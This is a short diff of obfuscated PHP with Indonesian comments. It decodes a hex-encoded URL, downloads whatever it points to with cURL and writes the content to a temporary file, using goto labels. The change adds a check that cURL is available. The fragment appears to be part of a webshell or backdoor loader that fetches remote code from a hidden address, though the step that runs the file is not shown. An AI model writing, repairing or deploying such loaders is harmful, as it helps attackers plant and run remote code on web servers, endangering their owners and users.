@@ -9,17 +9,23 @@ Label1:
 Label2: 
     $url = hex2bin($hexUrl);
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $data = curl_exec($ch);
-    curl_close($ch);
-    
-    if ($data === false) {
-        die('Error fetching the remote content.');
-    }
+    // Memeriksa apakah cURL diaktifkan
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($data === false) {
+            die('Error fetching the remote content.');
+        }
 
-    fwrite($tempFile, $data);
+        fwrite($tempFile, $data);
+    } else {
+        die('cURL tidak diaktifkan di server ini.');
+    }
+    
     goto Label3;
 
 Label3: 
